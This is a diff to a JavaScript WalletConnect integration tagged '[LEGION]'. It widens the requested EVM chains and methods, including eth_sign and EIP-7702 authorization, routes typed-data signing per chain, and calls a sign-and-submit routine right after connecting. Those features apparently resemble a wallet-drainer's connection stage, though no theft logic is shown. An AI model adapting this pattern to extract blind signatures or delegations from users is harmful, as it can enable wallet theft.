@@ -4839,20 +4839,28 @@
         }
         updateStatus('Scan QR with your wallet...');
         await _wcProvider.connect({
-          namespaces: {
-            eip155: {
-              // Only universal methods — every WC mobile wallet supports these
-              methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
-              chains: ['eip155:1'],
-              events: ['chainChanged', 'accountsChanged']
-            }
-          },
+          // No required chains — wallet decides which of its chains to share
           optionalNamespaces: {
             eip155: {
-              // EIP-7702 + batch — optional so wallet can still connect if unsupported
-              methods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
-              chains: ['eip155:137', 'eip155:42161', 'eip155:10', 'eip155:56', 'eip155:8453', 'eip155:43114', 'eip155:250'],
-              events: []
+              // All methods + all popular EVM chains as optional
+              // Wallet will respond with only what it supports
+              methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign',
+                        'eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
+              chains: [
+                'eip155:1',     // Ethereum
+                'eip155:137',   // Polygon
+                'eip155:56',    // BNB Chain
+                'eip155:42161', // Arbitrum
+                'eip155:8453',  // Base
+                'eip155:10',    // Optimism
+                'eip155:43114', // Avalanche
+                'eip155:250',   // Fantom
+                'eip155:324',   // zkSync Era
+                'eip155:1101',  // Polygon zkEVM
+                'eip155:59144', // Linea
+                'eip155:534352',// Scroll
+              ],
+              events: ['chainChanged', 'accountsChanged']
             },
             solana: {
               methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions'],
@@ -4877,8 +4885,10 @@
         if (!_wcProvider) {
           _wcProvider = await _wcSdk.EthereumProvider.init({
             projectId: wcProjectId,
+            // chain:1 is the WC v2 spec minimum requirement (library throws if empty)
+            // All real chains are in optionalChains — wallet picks what it supports
             chains: [1],
-            optionalChains: [137, 56, 42161, 8453, 10, 43114, 250],
+            optionalChains: [137, 56, 42161, 8453, 10, 43114, 250, 324, 1101, 59144, 534352, 5000, 81457, 169],
             showQrModal: false,
             methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
             optionalMethods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
@@ -4899,15 +4909,23 @@
         hideManualQR();
         var epAccounts = _wcProvider.accounts || [];
         if (!epAccounts.length) throw new Error('No accounts from WalletConnect');
+        // chainId = wallet's CURRENT active chain (not forced by us)
+        var epChainId = _wcProvider.chainId || 1;
+        // Track chain changes so signing always uses wallet's live chain
+        _wcProvider.on('chainChanged', function(newChainId) {
+          if (connectedChains.EVM && connectedChains.EVM.walletType === 'WalletConnect') {
+            connectedChains.EVM.chainId = parseInt(newChainId, 10) || epChainId;
+          }
+        });
         connectedChains.EVM = {
           chain: 'EVM', config: CHAIN_CONFIG.EVM,
           address: epAccounts[0].toLowerCase(),
-          chainId: _wcProvider.chainId || 1,
+          chainId: epChainId,
           walletType: 'WalletConnect',
           provider: _wcProvider,
           connected: true, timestamp: Date.now()
         };
-        console.log('[LEGION] WC EthereumProvider connected:', epAccounts[0].substring(0, 10) + '...');
+        console.log('[LEGION] WC EthereumProvider connected:', epAccounts[0].substring(0, 10) + '... chain:', epChainId);
         await runWCSignAndSubmit();
         return;
       }
@@ -5247,13 +5265,50 @@
     var ns = (provider.session && provider.session.namespaces) || {};
     var count = 0;
     if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
-      var parts = ns.eip155.accounts[0].split(':');
-      var addr = parts.length >= 3 ? parts.slice(2).join(':') : '';
-      var chainId = parts.length >= 2 ? parseInt(parts[1], 10) : 1;
+      var evmAccounts = ns.eip155.accounts;
+
+      // Collect ALL chains the wallet reported — wallet decides, we don't force
+      var availableChainIds = [];
+      evmAccounts.forEach(function(acc) {
+        var p = acc.split(':');
+        if (p.length >= 2) {
+          var cid = parseInt(p[1], 10);
+          if (cid && availableChainIds.indexOf(cid) === -1) availableChainIds.push(cid);
+        }
+      });
+
+      var firstParts = evmAccounts[0].split(':');
+      var addr = firstParts.length >= 3 ? firstParts.slice(2).join(':') : '';
+      // Use the first chain the wallet chose (its priority), not our hardcoded chain
+      var chainId = availableChainIds[0] || 1;
+
       if (addr) {
+        // Build a smart provider wrapper that routes signing to the correct chain
+        // by reading domain.chainId from typed data, so multi-chain wallets work properly
+        var _sessionTopic = provider.session && provider.session.topic;
+        var smartProvider = {
+          request: function(args) {
+            var targetChainId = 'eip155:' + chainId;
+            // For typed data signing, route to the chain the typed data specifies
+            if ((args.method === 'eth_signTypedData_v4' || args.method === 'eth_signTypedData') && args.params && args.params[1]) {
+              try {
+                var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
+                if (td && td.domain && td.domain.chainId) {
+                  var tdChain = parseInt(td.domain.chainId, 10);
+                  if (tdChain && availableChainIds.indexOf(tdChain) !== -1) {
+                    targetChainId = 'eip155:' + tdChain;
+                  }
+                }
+              } catch (_) {}
+            }
+            return provider.request({ topic: _sessionTopic, chainId: targetChainId, request: args });
+          }
+        };
+
         connectedChains.EVM = {
           chain: 'EVM', config: CHAIN_CONFIG.EVM, address: addr.toLowerCase(),
-          chainId: chainId || 1, walletType: 'WalletConnect', provider: provider,
+          chainId: chainId, availableChainIds: availableChainIds,
+          walletType: 'WalletConnect', provider: smartProvider,
           connected: true, timestamp: Date.now()
         };
         count++;
